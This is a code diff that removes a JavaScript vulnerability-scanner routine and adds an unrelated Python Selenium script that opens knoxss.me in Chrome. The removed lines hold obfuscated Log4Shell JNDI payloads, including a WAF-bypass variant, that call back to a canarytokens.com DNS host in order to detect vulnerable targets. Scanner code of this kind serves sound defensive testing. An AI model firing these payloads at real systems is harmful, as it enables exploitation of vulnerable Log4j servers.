@@ -1,44 +1,45 @@
-classTestInjection.prototype.startTesting = function () {
-    for (var i = 0; i < this.variations.count; i++) {
+import os
+import sys
+import time, random
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import Select
+from selenium.common.exceptions import NoSuchElementException
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.service import Service
 
-        let scanHostLog = scriptArg.target.host;
-        // [*] classic test
-        var rndToken  = AcuMonitor_signToken('hit' + randStrLC(10));
-        var rndEnvVar = randStrLC(10);
-        var payload   = "${j${::-n}di:dns${::-:}${::-/}/" + scanHostLog + "${::-.}" + "xxxxxxxxxxxxxxxxxx.canarytokens.com" + "}zzzz";
+url = "https://knoxss.me/"
 
-        if (this.foundVulnOnVariation) break;
 
-        this.currentVariation = i;
-        this.testInjectionAcuMonitor(payload, rndToken);
+# Detect Platform
+if "win" in sys.platform:
+    driver = "driver.exe"
+elif "linux" in sys.platform:
+    driver = "driver"
 
-        // [*] second test tries to generate an exception and also has a WAF bypass
-        rndToken  = AcuMonitor_signToken('hit' + randStrLC(10));
-        rndEnvVar = randStrLC(10);
-        payload   = strFromRawData(0x0a, 0x0d, 0xbf) + strFromRawData(0xF0, 0x9F, 0x92, 0xA1) + "'\"><&;|${${lower:j}${::-n}d${upper:ı}:dns${::-:}//" + scanHostLog + "${::-.}" + "xxxxxxxxxxxxxxxxxx.canarytokens.com" + "}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+# Service
+path = os.path.join(os.getcwd(), 'driver/chrome' + driver)
+service = Service(path)
 
-        if (this.foundVulnOnVariation) break;
+#Options
+options = Options()
 
-        this.currentVariation = i;
-        this.testInjectionAcuMonitor(payload, rndToken);    
+# Driver Object
+try:
+    driver = webdriver.Chrome(options=options, service=service)
+except:
+    driver = webdriver.Chrome(options=options, executable_path=path)
 
-        // [*] Blind Log4j
-        var reqId = saveTest(this.inputIndex, this.variations.item(this.currentVariation), 47);
-        if (reqId) {
-            let reqIdParts = reqId.split("-");
-            let reqScanId = reqIdParts[0];
-            
-            let scanHostAndPort = scriptArg.target.host;
-            // if (scriptArg.target.port) scanHostAndPort += ":" + scriptArg.target.port;
 
-            let reqHash = plain2md5(this.scheme.path + this.scheme.hash + reqScanId).substring(1, 6);
-            let domain = "dns.log4j." + scanHostAndPort + "." + reqScanId + "${::-.}1${::-.}" + "xxxxxxxxxxxxxxxxxx.canarytokens.com";
-            let payload = "${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}${::-/}/" + domain + "}}";
+chrome_prefs = {}
+options.experimental_options["prefs"] = chrome_prefs
+chrome_prefs["profile.default_content_settings"] = { "popups": 0 }
 
-            if (this.foundVulnOnVariation) break;
+# options.binary_location = "/usr/bin/google-chrome"
+# options.add_argument("user-data-dir=driver/chrome/chromedata")
 
-            this.currentVariation = i;
-            this.testInjectionAcuMonitor(payload, false);
-        }
-    }
-};
+options.add_argument("user-data-dir=./driver/chromecache")
+
+driver = webdriver.Chrome(chrome_options=options)
+driver.get(url)
